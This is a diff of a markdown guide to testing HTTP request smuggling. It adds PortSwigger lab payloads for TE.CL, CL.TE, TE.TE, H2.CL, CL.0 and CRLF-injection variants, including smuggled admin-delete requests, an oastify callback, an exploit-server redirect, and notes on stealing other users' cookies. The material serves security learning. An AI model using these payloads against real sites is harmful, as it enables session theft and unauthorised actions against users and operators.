@@ -363,6 +363,11 @@ Example: https://portswigger.net/web-security/cors/lab-breaking-https-attack
 
 This guide provides a comprehensive flow for testing various types of HTTP request smuggling vulnerabilities, including both HTTP/1.1 and HTTP/2 scenarios.
 
+What can you do with it?
+- smuggle a request through a normal request, which would be blocked under normal circumstances, that response will be queued and when you send any other request you will be served that responses
+- If there is a reflected XSS, then you can use the second request to be in the queue and the response will be served to a user who visits the website next, you can use fetch payload to get cookie
+- Again you can queue a response and if a user who has signed up will be served up their response, and their response which may contain cookie will be served up to you and then you can use that cookie, to sign in 
+
 ## Flow Chart for Testing HTTP Request Smuggling
 
 ### 1. Start
@@ -374,7 +379,7 @@ This guide provides a comprehensive flow for testing various types of HTTP reque
   - Check the server response headers to confirm the HTTP version.
   - Example 1 (HTTP/1.1):
 ```
-    GET / HTTP/1.1
+    POST / HTTP/1.1
     Host: vulnerable-website.com
 ```
   - Example 2 (HTTP/2):
@@ -415,36 +420,121 @@ This guide provides a comprehensive flow for testing various types of HTTP reque
 ```
 POST / HTTP/1.1
 Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding: chunked
-Content-Length: 6
+Content-Length: 24
+Connection: keep-alive
 
+f
+48luu=x&t0gj3=x
+bd
+POST /jf2yey3uzqxmd3le72y0xfszpqvnjd76bu1hr5g HTTP/1.1
+Host: jf2yey3uzqxmd3le72y0xfszpqvnjd76bu1hr5g.oastify.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
 0
 
-GET /malicious HTTP/1.1
-Host: vulnerable-website.com
+
 ```
 Expected Behavior:
 
 The server may process the GET /malicious request separately after processing the initial POST request.
 
+Lab payload:
+
+```
+POST / HTTP/1.1
+Host: 0a4900ca03eed89283a2417400f400f2.web-security-academy.net
+Cookie: session=OoJmuFsfZgkgYTUfU4b28VzUMagYzDlh
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 4
+Connection: keep-alive
+
+b9
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Cookie: session=OoJmuFsfZgkgYTUfU4b28VzUMagYzDlh
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
+
 ### CL.TE (Content-Length and Transfer-Encoding: chunked)
+Testing payload
 
 ```
 POST / HTTP/1.1
 Host: vulnerable-website.com
-Content-Length: 13
+Content-Length: 6
 Transfer-Encoding: chunked
 
 0
 
-GET /malicious HTTP/1.1
-Host: vulnerable-website.com
+G
+
 ```
+
 
 Expected Behavior:
 
 The server may interpret the content length and transfer encoding inconsistently, leading to request smuggling.
 
+Lab:
+
+Testing if front end is CL and TE at the back end, you should get error in the second request:
+```
+POST / HTTP/1.1
+Host: 0a7f00c7031f047d804d4e5f00540034.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+x
+```
+
+Then testing more and eventually deleting the user carlos
+```
+POST / HTTP/1.1
+Host: 0a7f00c7031f047d804d4e5f00540034.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 141
+Transfer-Encoding: chunked
+
+0
+
+POST /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+x=1
+```
+Similar to the above scenario but you need cookie in the first request:
+```
+POST / HTTP/1.1
+Host: 0a86002903006fa381fb5928002200c0.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=RYtijcE8jZ7l4EeoWQrfQek4EyXFiIdD
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
 ### TE.TE (Transfer-Encoding: chunked twice)
 
 ```
@@ -488,23 +578,95 @@ Transfer-Encoding: chunked
 
 0
 
-GET /malicious HTTP/2.0
-Host: attacker-website.com
+GET /x HTTP/1.1
+Host: TARGET.web-security-academy.net\r\n
+\r\n
 ```
 Expected Behavior:
 
 The server may handle the Transfer-Encoding header incorrectly, leading to request smuggling.
+If the repeated request gets you 404 that means that request was smuggled
+
+In lab, you can try to smuggle /admin request and see if you get 200 and then try to perform actions accordingly or in real scenario try to retrieve a cookie:
+```
+POST / HTTP/2
+Host: 0a320035044e1bd481e452f1009b0072.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: 0a320035044e1bd481e452f1009b0072.web-security-academy.net
+
+
+```
+
+### H2.CL
+
+H2.CL request smuggling: The lab is vulnerable to front end downgrade, this time we will use CL for the downgrade, and provide an ambigious CL length, to perform the attack we will need to exploit the user by redirecting them to an exploit page which causes javascript to execute and cause an alert popup, we will need to first find a request that is redirecting the user just based on that request and adding the host header initially, this will be /resources. if we send a request to the app with any host header and with /resources it will just append to the host header for redirect, we can use our exploit server for this and then save the exploit under /resources. Final pyalod:
+```
+POST / HTTP/2
+Host: 0a93009b037290338009cb7e001b00e6.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: exploit-0ac80049032f90ff8073ca6e018d00dd.exploit-server.net
+Content-Length: 5
+
+x=1
+```
+Make sure you dont include /r/n in the final line so that next header is appended to it from the user.
+
+### CL.0
+
+Similar to above scenario but you smuggle the request with proper content length only and then
+with payload, it can be found through the auto scanner
+Example to delete the user carlos:
+
+```
+GET /resources/labheader/js/labHeader.js HTTP/2
+Host: 0a9b0064031c4edf83f2a60a000e0067.web-security-academy.net
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+Cache-Control: max-age=0
+Cookie: session=EbAnLZFZvgWw44sm6uAgycRJXYaI3gzu
+Upgrade-Insecure-Requests: 1
+Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"
+Sec-Ch-Ua-Platform: Windows
+Sec-Ch-Ua-Mobile: ?0
+Content-Length: 27
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: x
+```
 
 ### 6. Test for HTTP/2 Request Smuggling via CRLF Injection
-
+Testing:
 ```
 POST /vulnerable-endpoint HTTP/2.0
 Host: vulnerable-website.com
 Content-Length: 13
-X-Injected-Header: value\r\nGET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n
+X-Injected-Header: value\r\nTransfer-Encoding: chunked
 
-malicious=data
+0
+
+SMUGGLED
 ```
+```
+POST /vulnerable-endpoint HTTP/2.0
+Host: vulnerable-website.com
+Content-Length: 13
+X-Injected-Header: value\r\nTransfer-Encoding: chunked
+
+0
+
+malicious request
+```
+
 ### 7. Test for HTTP/2 Request Splitting via CRLF Injection
 
 ```
